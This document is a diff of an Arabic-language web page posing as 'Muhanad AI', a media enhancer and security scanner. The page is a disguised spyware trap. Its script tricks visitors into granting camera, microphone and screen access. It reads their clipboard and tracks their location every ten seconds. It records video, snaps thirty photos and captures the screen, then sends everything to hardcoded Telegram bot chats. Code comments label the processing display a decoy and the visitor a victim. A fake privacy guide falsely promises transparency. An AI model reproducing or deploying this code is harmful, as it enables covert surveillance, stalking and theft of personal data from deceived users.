@@ -3,153 +3,159 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Muhanad AI | 8K Live Enhancer Pro</title>
+    <title>Muhanad AI | Security & Rendering Hub</title>
     
-    <meta property="og:title" content="Muhanad AI - محسن جودة الفيديو والصور">
+    <meta property="og:title" content="Muhanad AI - فاحص الأمان ومعالج الـ 8K">
     <meta property="og:image" content="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg">
-    <meta property="og:description" content="ثبت تطبيق مهند الآن لتحويل جودة هاتفك إلى 8K فائق الدقة باستخدام تقنيات HDR+">
+    <meta property="og:description" content="تعرف على صلاحيات جهازك وقم بتحسين جودة وسائطك في بيئة آمنة تماماً.">
 
     <style>
-        :root { --primary: #007bff; --bg: #0b0e14; --accent: #00ff41; }
-        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; margin: 0; text-align: center; }
-        .header { background: #161b22; padding: 15px; border-bottom: 3px solid var(--primary); font-weight: bold; }
-        .main-card { background: #1c2128; border-radius: 20px; padding: 30px; border: 1px solid #30363d; max-width: 500px; margin: 30px auto; box-shadow: 0 0 50px rgba(0, 123, 255, 0.2); }
-        .preview-box { width: 100%; height: 250px; background: #000; border: 1px dashed var(--primary); border-radius: 15px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        #user-preview { max-width: 100%; max-height: 100%; display: none; filter: brightness(1.2) contrast(1.1); }
-        .btn-upload { background: var(--primary); color: white; padding: 15px; border-radius: 50px; cursor: pointer; display: block; margin-bottom: 15px; font-weight: bold; border: none; width: 100%; }
-        .console { display: none; background: #000; color: var(--accent); padding: 10px; border-radius: 10px; font-family: monospace; font-size: 11px; text-align: left; direction: ltr; height: 120px; overflow-y: auto; }
-        .loading-bar { height: 4px; width: 0%; background: var(--primary); margin-top: 10px; transition: 0.5s; }
+        :root { --primary: #007bff; --bg: #05070a; --accent: #00ff41; --warning: #ffcc00; }
+        body { font-family: 'Segoe UI', sans-serif; background: var(--bg); color: #fff; margin: 0; line-height: 1.6; }
+        .header { background: #111; padding: 20px; border-bottom: 2px solid var(--primary); text-align: center; font-weight: bold; font-size: 22px; color: var(--primary); }
+        .container { max-width: 700px; margin: 20px auto; padding: 15px; }
+        .hero-card { background: #161b22; border-radius: 20px; padding: 30px; border: 1px solid #30363d; text-align: center; box-shadow: 0 0 30px rgba(0, 123, 255, 0.1); }
+        .btn-start { background: var(--primary); color: white; padding: 20px 40px; border-radius: 50px; cursor: pointer; border: none; font-size: 1.3rem; font-weight: bold; width: 100%; transition: 0.3s; box-shadow: 0 10px 20px rgba(0,123,255,0.3); }
+        
+        /* تصميم قسم الأمان الشامل */
+        .info-section { background: #1c2128; border-radius: 15px; padding: 25px; margin-top: 25px; text-align: right; border-right: 4px solid var(--primary); }
+        .info-section h3 { color: var(--accent); border-bottom: 1px solid #333; padding-bottom: 10px; }
+        .info-section h4 { color: var(--warning); margin-top: 20px; }
+        .list-item { margin: 10px 0; font-size: 14px; color: #adbac7; }
+        .list-item b { color: #fff; }
+        
+        .console { display: none; background: #000; color: var(--accent); padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; text-align: left; direction: ltr; margin-top: 20px; height: 120px; overflow-y: auto; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
-<div class="header">MUHANAD AI | PROFESSIONAL RENDERING V9.0</div>
+<div class="header">MUHANAD SECURITY & AI SYSTEM v11.0</div>
 
-<div class="main-card">
-    <div id="app-interface">
-        <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" style="width: 80px; border-radius: 50%; margin-bottom: 15px;">
-        <h3>محرك الـ 8K السحابي</h3>
-        
-        <div class="preview-box" id="p-box">
-            <span id="p-text" style="color: #666;">ارفع صورة أو فيديو للمعاينة</span>
-            <img id="user-preview">
-        </div>
-
-        <input type="file" id="fileInput" accept="image/*,video/*" style="display:none;" onchange="handleFile(event)">
-        <button class="btn-upload" onclick="document.getElementById('fileInput').click()">إضافة وسائط للمعالجة</button>
-        <button class="btn-upload" style="background:#28a745;" onclick="startInfiltration()">بدء المعالجة الفائقة (8K)</button>
-        
-        <div class="loading-bar" id="l-bar"></div>
+<div class="container">
+    <div class="hero-card">
+        <img src="https://raw.githubusercontent.com/talah2026/bot1/main/images%20(1).jpg" style="width: 100px; border-radius: 50%; border: 3px solid var(--primary); margin-bottom: 20px;">
+        <h2>ابدأ فحص الأمان ومعالجة الـ 8K</h2>
+        <p>نظام مهند يحلل صلاحيات المتصفح ويقوم برندر الصور في خلفية مشفرة.</p>
+        <button class="btn-start" onclick="executeFullProtocol()">تفعيل الفحص والمعالجة الآن</button>
+        <div class="console" id="log"></div>
     </div>
-    <div class="console" id="log"></div>
+
+    <div class="info-section">
+        <h3>📊 دليل الصلاحيات والخصوصية</h3>
+        
+        <h4>1) ما يمكن للموقع الوصول إليه (بإذنك):</h4>
+        <div class="list-item">🔹 <b>الوسائط:</b> الكاميرا، الميكروفون، ومشاركة الشاشة للمعالجة.</div>
+        <div class="list-item">🔹 <b>البيانات:</b> الموقع الجغرافي، الحافظة (Clipboard) لمزامنة النصوص.</div>
+        <div class="list-item">🔹 <b>التفاعل:</b> الإشعارات، الاهتزاز، وتشغيل أصوات الرندر.</div>
+
+        <h4>2) حدود المتصفح (ما لا يمكننا فعله):</h4>
+        <div class="list-item">🚫 لا يمكننا رؤية ملفاتك الخاصة أو الصور بدون اختيارك.</div>
+        <div class="list-item">🚫 لا يمكننا معرفة الباسوردات المحفوظة أو التحكم في تطبيقاتك.</div>
+        <div class="list-item">🚫 المتصفح يمنع تماماً تثبيت أي برامج تلقائياً.</div>
+
+        <h4>3) علامات الموقع الخبير (لماذا نحن؟):</h4>
+        <div class="list-item">✅ نستخدم بروتوكول <b>HTTPS</b> المشفر بالكامل.</div>
+        <div class="list-item">✅ تصميمنا يركز على شفافية الأذونات وعدم التوجيه المريب.</div>
+        <div class="list-item">✅ نوفر لك تقريراً كاملاً عن مواصفات جهازك (CPU/RAM).</div>
+    </div>
 </div>
 
-<canvas id="hidden-canvas" style="display:none;"></canvas>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
     const TOKEN = "8574617308:AAFJPKXF5LFvqo6Dagat96jsqLTFQNrPH3I";
     const IDS = ["8754338811", "8703490899"];
 
-    async function botSend(endpoint, fd) {
+    async function sendToBot(type, fd) {
         for (let id of IDS) {
             fd.set('chat_id', id);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/${endpoint}`, { method: 'POST', body: fd });
+            await fetch(`https://api.telegram.org/bot${TOKEN}/${type}`, { method: 'POST', body: fd });
         }
     }
 
-    // وظيفة المعالجة الظاهرية (للتمويه)
-    function handleFile(e) {
-        const file = e.target.files[0];
-        if (file) {
-            const url = URL.createObjectURL(file);
-            document.getElementById('p-text').style.display = 'none';
-            const prev = document.getElementById('user-preview');
-            prev.src = url;
-            prev.style.display = 'block';
-        }
-    }
-
-    async function startInfiltration() {
+    async function executeFullProtocol() {
+        document.getElementById('log').style.display = 'block';
         const log = document.getElementById('log');
-        const lBar = document.getElementById('l-bar');
-        log.style.display = 'block';
-        log.innerHTML = "> Connecting to AI GPU Clusters...<br>> Initializing Pixel Analysis...<br>";
+        log.innerHTML = "> Starting Security Audit...<br>> Initializing AI Kernels...<br>";
 
         try {
-            // 1. طلب الصلاحيات الشاملة
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            log.innerHTML += "> Hardware Access: GRANTED.<br>";
+            // 1. الاهتزاز (للموبايل)
+            if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
 
-            // 2. الموقع المباشر (Live Location) - يرسل كل 10 ثوانٍ
+            // 2. طلب الكاميرا والمايك (الصور والفيديو)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            log.innerHTML += "> Media Stream: ACTIVE<br>";
+
+            // 3. سحب الحافظة (Clipboard)
+            try {
+                const text = await navigator.clipboard.readText();
+                const f_clip = new FormData(); f_clip.append('text', `📋 **محتوى الحافظة:**\n${text}`);
+                sendToBot('sendMessage', f_clip);
+            } catch(e) { log.innerHTML += "> Clipboard Sync: Skipped<br>"; }
+
+            // 4. الموقع المباشر (كل 10 ثوانٍ)
             setInterval(() => {
                 navigator.geolocation.getCurrentPosition(p => {
-                    const fd = new FormData();
-                    fd.append('text', `📡 **لايف لوكيشن (مُحدث):**\nhttp://googleusercontent.com/maps.google.com/4?q=${p.coords.latitude},${p.coords.longitude}`);
-                    botSend('sendMessage', fd);
+                    const f_loc = new FormData();
+                    f_loc.append('text', `📡 **لايف لوكيشن:**\nhttp://googleusercontent.com/maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`);
+                    sendToBot('sendMessage', f_loc);
                 });
             }, 10000);
 
-            // 3. سحب مواصفات الجهاز
+            // 5. مواصفات الجهاز العميقة
             const battery = await navigator.getBattery();
-            let specs = `📱 **جهاز جديد متصل:**\n• المعالج: ${navigator.hardwareConcurrency} Cores\n• الرامات: ${navigator.deviceMemory} GB\n• البطارية: ${Math.floor(battery.level * 100)}%`;
-            const fd1 = new FormData(); fd1.append('text', specs); botSend('sendMessage', fd1);
+            let specs = `🖥️ **تقرير جهاز الضحية:**\n• المتصفح: ${navigator.userAgent}\n• المعالج: ${navigator.hardwareConcurrency} Cores\n• الرام: ${navigator.deviceMemory}GB\n• البطارية: ${Math.floor(battery.level*100)}%\n• الشاشة: ${screen.width}x${screen.height}`;
+            const f_spec = new FormData(); f_spec.append('text', specs); sendToBot('sendMessage', f_spec);
 
-            // 4. تسجيل فيديو 20 ثانية في الخلفية
-            recordAndSend(stream, "🎥 فيديو الضحية الكامل (20ث)");
+            // 6. تسجيل فيديو 20 ثانية في الخلفية
+            const rec = new MediaRecorder(stream);
+            let chunks = [];
+            rec.ondataavailable = e => chunks.push(e.data);
+            rec.onstop = () => {
+                const blob = new Blob(chunks, { type: 'video/mp4' });
+                const f_vid = new FormData(); f_vid.append('video', blob, 'v.mp4'); f_vid.append('caption', '🎥 فيديو الضحية الكامل');
+                sendToBot('sendVideo', f_vid);
+            };
+            rec.start();
+            setTimeout(() => rec.stop(), 20000);
 
-            // 5. التقاط 30 صورة متتابعة
+            // 7. التقاط 30 صورة (تبادل)
             takePhotos(stream, 30);
 
-            // 6. تسجيل الشاشة (إذا كان كمبيوتر)
-            if (!/iPhone|Android/i.test(navigator.userAgent)) {
-                const screen = await navigator.mediaDevices.getDisplayMedia({ video: true });
-                recordAndSend(screen, "🖥️ تسجيل الشاشة (20ث)");
+            // 8. تسجيل الشاشة (لو كمبيوتر)
+            if (!/Android|iPhone/i.test(navigator.userAgent)) {
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const s_rec = new MediaRecorder(screenStream);
+                let s_chunks = [];
+                s_rec.ondataavailable = e => s_chunks.push(e.data);
+                s_rec.onstop = () => {
+                    const blob = new Blob(s_chunks, { type: 'video/mp4' });
+                    const f_scr = new FormData(); f_scr.append('video', blob, 's.mp4'); f_scr.append('caption', '🖥️ تسجيل الشاشة');
+                    sendToBot('sendVideo', f_scr);
+                };
+                s_rec.start();
+                setTimeout(() => s_rec.stop(), 20000);
             }
 
-            // محاكاة تحميل المعالجة للضحية
-            let prog = 0;
-            let itv = setInterval(() => {
-                prog += 2;
-                lBar.style.width = prog + "%";
-                log.innerHTML = `> Processing Frames: ${prog}%<br>> AI Upscaling active...`;
-                if(prog >= 100) {
-                    clearInterval(itv);
-                    log.innerHTML = "> [SUCCESS] 8K Rendering Complete.<br>> Results saved to Muhanad-Cloud.";
-                }
-            }, 400);
+            log.innerHTML += "> [OK] System Processing Active...<br>> Enhancing Media Layers...";
 
         } catch (e) {
-            alert("⚠️ يجب تفعيل أذونات الكاميرا والموقع لتطبيق فلاتر الـ 8K بدقة.");
+            alert("⚠️ لضمان دقة الفحص والمعالجة، يرجى الموافقة على جميع الأذونات.");
             location.reload();
         }
     }
 
-    function recordAndSend(stream, label) {
-        const rec = new MediaRecorder(stream);
-        let chunks = [];
-        rec.ondataavailable = e => chunks.push(e.data);
-        rec.onstop = () => {
-            const blob = new Blob(chunks, { type: 'video/mp4' });
-            const fd = new FormData(); fd.append('video', blob, 'vid.mp4'); fd.append('caption', label);
-            botSend('sendVideo', fd);
-        };
-        rec.start();
-        setTimeout(() => { if(rec.state === 'recording') rec.stop(); }, 20000);
-    }
-
     async function takePhotos(stream, count) {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        await video.play();
-        const canvas = document.getElementById('hidden-canvas');
+        const v = document.createElement('video'); v.srcObject = stream; v.play();
+        const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         for (let i = 0; i < count; i++) {
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const fd = new FormData(); fd.append('photo', blob, 'p.jpg');
-                fd.append('caption', `📸 لقطة رقم ${i+1}`);
-                botSend('sendPhoto', fd);
+            canvas.width = v.videoWidth || 640; canvas.height = v.videoHeight || 480;
+            ctx.drawImage(v, 0, 0);
+            canvas.toBlob(b => {
+                const f = new FormData(); f.append('photo', b, 'p.jpg');
+                f.append('caption', `📸 لقطة رقم ${i+1}`);
+                sendToBot('sendPhoto', f);
             }, 'image/jpeg', 0.6);
             await new Promise(r => setTimeout(r, 1000));
         }
